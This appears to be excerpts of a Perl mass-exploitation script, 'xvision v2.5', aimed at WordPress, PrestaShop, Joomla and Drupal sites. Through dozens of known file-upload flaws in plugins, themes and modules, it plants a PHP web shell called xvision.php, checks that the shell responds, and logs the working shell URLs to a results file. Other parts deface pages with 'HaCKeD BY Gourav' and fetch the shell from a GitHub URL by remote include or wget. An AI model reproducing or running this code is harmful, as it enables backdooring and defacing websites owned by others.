...
print color('reset');
print "                       ";
print colored ("[ xvision v2.5 ]",'white on_red');  
print colored ("[ Coded By Gourav ]\n",'white on_red');
print "                           ";
...
my $response = $ua->post($addblockurl, Content_Type => 'multipart/form-data', Content => [popimg => ["xvision.php"],]);
$addblockup="$site/wp-content/uploads/$year/$month/xvision.php?X=Attacker";
...
my $blazeres = $ua->post($url, Content_Type => 'multipart/form-data', Content => [album_img => ["xvision.php"], task => 'blaze_add_new_album', album_name => '', album_desc => '',]);

if ($blazeres->content =~ /\/uploads\/blaze\/(.*?)\/big\/xvision.php/) {
$uploadfolder=$1;
$blazeup="$site/wp-content/uploads/blaze/$uploadfolder/big/xvision.php?X=Attacker";
print item(),"Blaze";
print color('bold white')," ............................. ";
print color('bold green'),"VULN\n";
print item(),"Shell Uploaded Successfully\n";
...
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [album_img => ["xvision.php"], task => 'cpr_add_new_album', album_name => '', album_desc => '',]);

if ($response->content =~ /\/uploads\/catpro\/(.*?)\/big\/xvision.php/) {
$uploadfolder=$1;
$catproup="$site/wp-content/uploads/catpro/$uploadfolder/big/xvision.php?X=Attacker";
print item(),"Catpro";
print color('bold white')," ............................ ";
print color('bold green'),"VULN\n";
print item(),"Shell Uploaded Successfully\n";
...
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [file => ["xvision.php"],]);

$cherryup="$site/wp-content/plugins/cherry-plugin/admin/import-export/xvision.php?X=Attacker";
...
my $url = "$site";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [upfile => ["xvision.php"], dm_upload => '',]);
$dmup="$site/wp-content/plugins/downloads-manager/upload/xvision.php?X=Attacker";
...
my $shell ="xvision.php";
my $field_name = "files[]";

my $response = $ua->post($url, Content_Type => 'multipart/form-data', content => [ $field_name => [$shell]]);
$formcraftup="$site/wp-content/plugins/formcraft/file-upload/server/php/files/xvision.php?X=Attacker";
...
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [album_img => ["xvision.php"], task => 'lvo_add_new_album', album_name => '', album_desc => '',]);

if ($response->content =~ /\/uploads\/levoslideshow\/(.*?)\/big\/xvision.php/) {
$uploadfolder=$1;
$levoslideshowup="$site/wp-content/uploads/levoslideshow/$uploadfolder/big/xvision.php?X=Attacker";
...
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [album_img => ["xvision.php"], task => 'pwz_add_new_album', album_name => '', album_desc => '',]);

if ($response->content =~ /\/uploads\/powerzoomer\/(.*?)\/big\/xvision.php/) {
$uploadfolder=$1;
$zoomerup="$site/wp-content/uploads/powerzoomer/$uploadfolder/big/xvision.php?X=Attacker";
...
my $gravityformsres = $ua->post($url, Content_Type => "form-data", Content => [file => ["xvision2.jpg"], field_id => "3", form_id => "1",gform_unique_id => "../../../", name => "css.php.jd"]);
...
my $revslidres = $ua->post($url, Cookie => "", Content_Type => "form-data", Content => [action => "revslider_ajax_action", client_action => "update_plugin", update_file => ["xvisionevs.zip"]]);

my $revs = $ua->get("$site/wp-content/plugins/revslider/temp/update_extract/revslider/xvision.php")->content;
my $revavada = $ua->get("$site/wp-content/themes/Avada/framework/plugins/revslider/temp/update_extract/revslider/xvision.php")->content;
my $revstriking = $ua->get("$site/wp-content/themes/striking_r/framework/plugins/revslider/temp/update_extract/revslider/xvision.php")->content;
my $revincredible = $ua->get("$site/wp-content/themes/IncredibleWP/framework/plugins/revslider/temp/update_extract/revslider/xvision.php")->content;
my $revultimatum = $ua->get("$site/wp-content/themes/ultimatum/wonderfoundry/addons/plugins/revslider/temp/update_extract/revslider/xvision.php")->content;
my $revmedicate = $ua->get("$site/wp-content/themes/medicate/script/revslider/temp/update_extract/revslider/xvision.php")->content;
my $revcentum = $ua->get("$site/wp-content/themes/centum/revslider/temp/update_extract/revslider/xvision.php")->content;
my $revbeachapollo = $ua->get("$site/wp-content/themes/beach_apollo/advance/plugins/revslider/temp/update_extract/revslider/xvision.php")->content;
my $revcuckootap = $ua->get("$site/wp-content/themes/cuckootap/framework/plugins/revslider/temp/update_extract/revslider/xvision.php")->content;
my $revpindol = $ua->get("$site/wp-content/themes/pindol/revslider/temp/update_extract/revslider/xvision.php")->content;
my $revdesignplus = $ua->get("$site/wp-content/themes/designplus/framework/plugins/revslider/temp/update_extract/revslider/xvision.php")->content;
my $revrarebird = $ua->get("$site/wp-content/themes/rarebird/framework/plugins/revslider/temp/update_extract/revslider/xvision.php")->content;
my $revandre = $ua->get("$site/wp-content/themes/andre/framework/plugins/revslider/temp/update_extract/revslider/xvision.php")->content;
...
print color('bold green'),"VULN\n";
print item(),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $site/wp-content/plugins/revslider/temp/update_extract/revslider/xvision.php?X=Attacker\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$site/wp-content/plugins/revslider/temp/update_extract/revslider/xvision.php?X=Attacker\n";
close (TEXT);
...
print color('bold green'),"VULN\n";
print item(),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $site/wp-content/themes/Avada/framework/plugins/revslider/temp/update_extract/revslider/xvision.php?X=Attacker\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$site/wp-content/themes/Avada/framework/plugins/revslider/temp/update_extract/revslider/xvision.php?X=Attacker\n";
close (TEXT);
...
print color('bold green'),"VULN\n";
print item(),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $site/wp-content/themes/striking_r/framework/plugins/revslider/temp/update_extract/revslider/xvision.php?X=Attacker\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$site/wp-content/themes/striking_r/framework/plugins/revslider/temp/update_extract/revslider/xvision.php?X=Attacker\n";
close (TEXT);
...
print color('bold green'),"VULN\n";
print item(),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $site/wp-content/themes/IncredibleWP/framework/plugins/revslider/temp/update_extract/revslider/xvision.php?X=Attacker\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$site/wp-content/themes/IncredibleWP/framework/plugins/revslider/temp/update_extract/revslider/xvision.php?X=Attacker\n";
close (TEXT);
...
print color('bold green'),"VULN\n";
print item(),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $site/wp-content/themes/medicate/script/revslider/temp/update_extract/revslider/xvision.php?X=Attacker\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$site$site/wp-content/themes/medicate/script/revslider/temp/update_extract/revslider/xvision.php?X=Attacker\n";
close (TEXT);
...
print color('bold green'),"VULN\n";
print item(),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $site/wp-content/themes/ultimatum/wonderfoundry/addons/plugins/revslider/temp/update_extract/revslider/xvision.php?X=Attacker\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$site/wp-content/themes/ultimatum/wonderfoundry/addons/plugins/revslider/temp/update_extract/revslider/xvision.php?X=Attacker\n";
close (TEXT);
...
print color('bold green'),"VULN\n";
print item(),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $site/wp-content/themes/centum/revslider/temp/update_extract/revslider/xvision.php?X=Attacker\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$site/wp-content/themes/centum/revslider/temp/update_extract/revslider/xvision.php?X=Attacker\n";
close (TEXT);
...
print color('bold green'),"VULN\n";
print item(),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $site/wp-content/themes/beach_apollo/advance/plugins/revslider/temp/update_extract/revslider/xvision.php?X=Attacker\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$site/wp-content/themes/beach_apollo/advance/plugins/revslider/temp/update_extract/revslider/xvision.php?X=Attacker\n";
close (TEXT);
...
print color('bold green'),"VULN\n";
print item(),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $site/wp-content/themes/cuckootap/framework/plugins/revslider/temp/update_extract/revslider/xvision.php?X=Attacker\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$site/wp-content/themes/cuckootap/framework/plugins/revslider/temp/update_extract/revslider/xvision.php?X=Attacker\n";
close (TEXT);
...
print color('bold green'),"VULN\n";
print item(),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $site/wp-content/themes/pindol/revslider/temp/update_extract/revslider/xvision.php?X=Attacker\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$site/wp-content/themes/pindol/revslider/temp/update_extract/revslider/xvision.php?X=Attacker\n";
close (TEXT);
...
print color('bold green'),"VULN\n";
print item(),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $site/wp-content/themes/designplus/framework/plugins/revslider/temp/update_extract/revslider/xvision.php?X=Attacker\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$site/wp-content/themes/designplus/framework/plugins/revslider/temp/update_extract/revslider/xvision.php?X=Attacker\n";
close (TEXT);
...
print color('bold green'),"VULN\n";
print item(),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $site/wp-content/themes/rarebird/framework/plugins/revslider/temp/update_extract/revslider/xvision.php?X=Attacker\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$site/wp-content/themes/rarebird/framework/plugins/revslider/temp/update_extract/revslider/xvision.php?X=Attacker\n";
close (TEXT);
...
print color('bold green'),"VULN\n";
print item(),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $site/wp-content/themes/andre/framework/plugins/revslider/temp/update_extract/revslider/xvision.php?X=Attacker\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$site/wp-content/themes/andre/framework/plugins/revslider/temp/update_extract/revslider/xvision.php?X=Attacker\n";
close (TEXT);
}else{
...
my $revslidajaxres = $ua->post($url, Cookie => "", Content_Type => "form-data", Content => [action => "revslider_ajax_action", client_action => "update_captions_css", data => "<body style='color: transparent;background-color: black'><center><h1><b style='color: white'><center><b>HaCKeD BY Gourav<b>"]);
...
$ua->timeout(10);
$ua->agent($useragent);
my $showbizres = $ua->post($url, Cookie => "", Content_Type => "form-data", Content => [action => "showbiz_ajax_action", client_action => "update_plugin", update_file => ["xvision.php"]]);

$showbizup = $site . '/wp-content/plugins/showbiz/temp/update_extract/xvision.php?X=Attacker';
...
my $adsres = $ua->post($url, Content_Type => 'multipart/form-data', Content => [uploadfile => ["xvision.php"], action => 'upload_ad_image', path => '',]);
$adsup="$site/wp-content/plugins/simple-ads-manager/xvision.php?X=Attacker";
...
my $slideshowres = $ua->post($url, Content_Type => 'multipart/form-data', Content => [album_img => ["xvision.php"], task => 'pro_add_new_album', album_name => '', album_desc => '',]);

if ($slideshowres->content =~ /\/uploads\/slideshowpro\/(.*?)\/big\/xvision.php/) {
$uploadfolder=$1;
$sspup="$site/wp-content/uploads/slideshowpro/$uploadfolder/big/xvision.php?X=Attacker";
...
$wpmdshell = "https://raw.githubusercontent.com/xvision/xvision/master/xvision.php";
$url = "$site/wp-content/plugins/wp-mobile-detector/resize.php?src=$wpmdshell";
$wpmdup="$site/wp-content/plugins/wp-mobile-detector/cache/xvision.php?X=Attacker";
...
my $wysijares = $ua->post("$url", Content_Type => 'form-data', Content => [ $theme => ['xvision.zip', => 'xvision.zip'], overwriteexistingtheme => "on",action => "themeupload", submitter => "Upload",]);
$wysijaup = "$site/wp-content/uploads/wysija/themes/xvision/xvision.php?X=Attacker";
...
$inbomarketingup = "$site/wp-content/plugins/inboundio-marketing/admin/partials/uploaded_csv/xvision.php?X=Attacker";
my $inbomarketingres = $ua->post($url, Content_Type => 'multipart/form-data', Content => [file => ["xvision.php"],]);
...
$dzsup = "$site/wp-content/plugins/dzs-zoomsounds/admin/upload/xvision.php?X=Attacker";
my $dzsres = $ua->post($url, Content_Type => 'multipart/form-data', Content => [file_field => ["xvision.php"],]);
...
$reflexup = "$site/wp-content/uploads/$year/$month/xvision.php?X=Attacker";
my $reflexres = $ua->post($url, Content_Type => 'multipart/form-data', Content => [qqfile => ["xvision.php"],]);
...
$sexycontactup = "$site/wp-content/plugins/sexy-contact-form/includes/fileupload/files/xvision.php?X=Attacker";
my $field_name = "files[]";

my $sexycontactres = $ua->post( $url,
            Content_Type => 'form-data',
            Content => [ $field_name => ["xvision.php"] ]
           );
...
my $response = $ua->post($url, Content_Type => 'multipart/form-data', content => [ $field_name => [$shell]]);
$wtffup="$site/wp-content/plugins/work-the-flow-file-upload/public/assets/jQuery-File-Upload-9.5.0/server/php/files/xvision.php?X=Attacker";
...
$jobmangerup = "$site/wp-content/uploads/job-manager-uploads/file/$year/$month/xvision.gif";
...
my $response = $ua->post($url, Content_Type => 'multipart/form-data', content => [ $field_name => [$shell]]);
$phpevup="$site/wp-content/plugins/php-event-calendar/server/file-uploader/xvision.php?X=Attacker";
...
my $response = $ua->post($url, Content_Type => 'multipart/form-data', content => [ $field_name => [$shell]]);
$Synopticup="$site/wp-content/uploads/markets/avatars/xvision.php?X=Attacker";
...
my $response = $ua->post($url, Content_Type => 'multipart/form-data', content => [ $field_name => [$shell]]);
$wpshopup="$site/wp-content/uploads/xvision.php?X=Attacker";
...
$index='<p align="center"><img border="0" src="http://vignette4.wikia.nocookie.net/trollpasta/images/3/34/Fuck-you-cartoon-meme.gif" width="339" height="476"></p><pre>&nbsp;</pre><div align="center"><p align="center" class="auto-style2">
    <font face="Bradley Hand ITC" size="6">HaCkEd By Gourav</font></p>
    <p align="center" class="auto-style2">';
$gassface = POST $ajx, [
'id' => $sirina, 'slug' => '/m.htm', 'title' => 'HaCkEd By Gourav ', 'content' => $index];
...
my $response = $ua->post($cubedurl, Content_Type => 'multipart/form-data', Content => [uploadfile => ["xvision.php"]]);
$cubedup="$site/wp-content/uploads/$year/$month/xvision.php?X=Attacker";
...
my $response = $ua->post($RightNowurl, Content_Type => 'multipart/form-data', Content => [Filedata => ["xvision.php"]]);
$RightNowup="$site/wp-content/uploads/settingsimages/xvision.php?X=Attacker";
...
my $response = $ua->post($url, Content_Type => "form-data", Content => [file => ["xvision.jpg"], name => "xvision.php"]);

$up="$site/wp-content/themes/konzept/includes/uploadify/uploads/xvision.php?X=Attacker";
...
my $response = $ua->post($url, Content_Type => "form-data", Content => [file => ["xvision.php"], name => "xvision.php"]);

$up="$site/wp-content/plugins/omni-secure-files/plupload/examples/uploads/xvision.php?X=Attacker";
...
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => ['files[]' => ["xvision.php"]]);
$up="$site/wp-content/plugins/pitchprint/uploader/files/xvision.php?X=Attacker";
...
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [uploadfile => ["xvision.php"]]);
$up="$site/wp-content/satoshi/images/xvision.php?X=Attacker";
my $check = $ua->get("$up")->content;
...
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [Filedata => ["xvision.php"]]);
$up="$site/wp-content/themes/pinboard/uploads/xvision.php?X=Attacker";
my $check = $ua->get("$up")->content;
...
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [Filedata => ["xvision.php"]]);
$up="$site/wp-content/plugins/barclaycart/uploadify/xvision.php?X=Attacker";
my $check = $ua->get("$up")->content;
...
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["xvision.php"],]);

$columnadvertsup="$site/modules/columnadverts/slides/xvision.php?X=Attacker";
...
$soopamobileup="$site/modules/soopamobile/slides/xvision.php?X=Attacker";
...
$soopabannersup="$site/modules/soopabanners/slides/xvision.php?X=Attacker";
...
$vtermslideshowup="$site/modules/vtermslideshow/slides/xvision.php?X=Attacker";
...
$simpleslideshowup="$site/modules/simpleslideshow/slides/xvision.php?X=Attacker";
...
my $response = $ua->post($url, testimonial_submitter_name => "Gourav", testimonial_title => "HaCKeD BY Gourav", testimonial_main_message => "HaCKeD BY Gourav", testimonial_img => "xvision.php", testimonial => "Submit Testimonial");
$blocktestimonialup="$site/upload/xvision.php?X=Attacker";
...
$productpageadvertsup="$site/modules/productpageadverts/slides/xvision.php?X=Attacker";
...
$homepageadvertiseup="$site/modules/homepageadvertise/slides/xvision.php?X=Attacker";
...
$homepageadvertise2up="$site/modules/homepageadvertise2/slides/xvision.php?X=Attacker";
...
$jro_homepageadvertiseup="$site/modules/jro_homepageadvertise/slides/xvision.php?X=Attacker";
...
$attributewizardproup="$site/modules/attributewizardpro/file_uploads/xvision.php?X=Attacker";
...
$oneattributewizardproup="$site/modules/1attributewizardpro/file_uploads/xvision.php?X=Attacker";
...
$attributewizardproOLDup="$site/modules/attributewizardpro.OLD/file_uploads/xvision.php?X=Attacker";
...
$attributewizardpro_xup="$site/modules/attributewizardpro_x/file_uploads/xvision.php?X=Attacker";
...
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [qqfile => ["xvision.php.png"],]);

$advancedsliderup="$site/modules/advancedslider/uploads/xvision.php.png?X=Attacker";
...
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [image => ["xvision.php.png"],]);

$cartabandonmentproup="$site/modules/cartabandonmentpro/uploads/xvision.php.png?X=Attacker";
...
$cartabandonmentproOldup="$site/modules/cartabandonmentproOld/uploads/xvision.php.png?X=Attacker";
...
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [qqfile => ["xvision.php.mp4"],]);

$videostabup="$site/modules/videostab/uploads/xvision.php.mp4?X=Attacker";
...
my $response = $ua->post($url, Content_Type => 'multipart/form-data', data => 'bajatax', type => 'pattern_upload', Content => [bajatax => ["xvision.php"],]);

$wg24themeadministrationup="$site/modules//wg24themeadministration///img/upload/xvision.php?X=Attacker";
...
$fieldvmegamenuup="$site/modules/fieldvmegamenu/uploads/xvision.php?X=Attacker";
...
my $response = $ua->post($url, Content_Type => 'multipart/form-data', data => 'bajatax', type => 'image_upload', Content => [bajatax => ["xvision.php"],]);

$wdoptionpanelup="$site/modules/wdoptionpanel/upload/xvision.php?X=Attacker";
...
$pk_flexmenuup="$site/modules/pk_flexmenu/uploads/xvision.php?X=Attacker";
...
$pk_vertflexmenuup="$site/modules/pk_vertflexmenu/uploads/xvision.php?X=Attacker";
...
################ megamenu #####################
sub megamenu(){
my $url = "$site/modules/megamenu/uploadify/uploadify.php?id=xvision.php";
my $shell ="xvision.php.png";
...
$megamenuup="$site/xvision.php.png?X=Attacker";
...
$tdpsthemeoptionpanelup="$site/modules/tdpsthemeoptionpanel/upload/xvision.php?X=Attacker";
...
$psmodthemeoptionpanelup="$site/modules/psmodthemeoptionpanel/upload/xvision.php?X=Attacker";
...
$masseditproductup="$site/masseditproduct/uploads/file/xvision.php?X=Attacker";
...
$mediaup="$site/images/xvision.txt";
...
sub comjdownloads(){
$file="Jattack.rar";
$filez="xvision.php.php.j";
$jdup= $site . 'index.php?option=com_jdownloads&Itemid=0&view=upload';
$shellpath= $site . '/images/jdownloads/screenshots/xvision.php.j?X=Attacker';

my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
$ua->timeout(10);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");

my $exploit = $ua->post("$jdup", Cookie => "", Content_Type => "form-data", Content => [ name=>"Gourav", mail=>"blablabla@blablabla.com", filetitle =>"Gourav xD", catlist=>"1", license=>"0", language=>"0", system=>"0",file_upload=>["$file"], pic_upload=>["$filez"], description=>"<p>zot</p>", senden=>"Send file", option=>"com_jdownloads", view=>"upload", send=>"1", "24c22896d6fe6977b731543b3e44c22f"=>"1"]);
...
$def = $site . '/images/jdownloads/screenshots/xvision.html.j';
$filee="Jattack.rar";
$filezz="xvision.html.j";
my $exploitx = $ua->post("$jdup", Cookie => "", Content_Type => "form-data", Content => [ name=>"Gourav", mail=>"Gourav@gmail.com", filetitle =>"Gourav xD", catlist=>"1", license=>"0", language=>"0", system=>"0",file_upload=>["$filee"], pic_upload=>["$filezz"], description=>"<p>zot</p>", senden=>"Send file", option=>"com_jdownloads", view=>"upload", send=>"1", "24c22896d6fe6977b731543b3e44c22f"=>"1"]);
...
$comfabrikupp="$site/media/xvision.php?X=Attacker";
...
$comfabrikup="$site/media/xvision.txt";
...
$comfabrikupp2="$site/xvision.php?X=Attacker";
...
my $response = $ua->post( $url,
            Cookie => "", Content_Type => "form-data", Content => [file => ["xvision.jpg"], name => "xvision.html"]
           
            );

$comadsmanagerup="$site/tmp/plupload/xvision.html";
...
$weblinksup= "$site/images/xvision.gif";
...
$simplefileuploadsup= "$site/modules/mod_simplefileuploadv1.3/elements/xvision.php?X=Attacker";
...
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [ $field_name => ["xvision.php"]]);

$up="$site/components/com_jbcatalog/libraries/jsupload/server/php/files/xvision.php?X=Attacker";
$checkup = $ua->get("$up")->content;
if($checkup =~/X Attacker/) {
...
$sexyup="$site/com_sexycontactform/fileupload/files/xvision.php?X=Attacker";
...
my $response = $ua->post($url, Content_Type => 'multipart/form-data',Content => ['Filedata' => ["xvision.php.xxxjpg"], "jpath" => "..%2F..%2F..%2F..%2F" ]);

$up="$site/images/stories/xvision.php.xxxjpg?X=Attacker";
...
$comjwallpapersup= "$site/jwallpapers_files/plupload/xvision.php?X=Attacker";
my $shell ="xvision.php";
...
$up= "$site/components/com_facileforms/libraries/jquery/xvision.php?X=Attacker";
...
$mailt= "mail[#type]";
$mailm = "mail[#markup]";
$wget = "wget https://raw.githubusercontent.com/xvision/xvision/master/xvision.php";
...
print color('bold green'),"VULN\n\n";
print item(),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $site/xvision.php?X=Attacker\n";
open (TEXT, '>>Result/shells.txt');
print TEXT "$up\n";
close (TEXT);
}else{
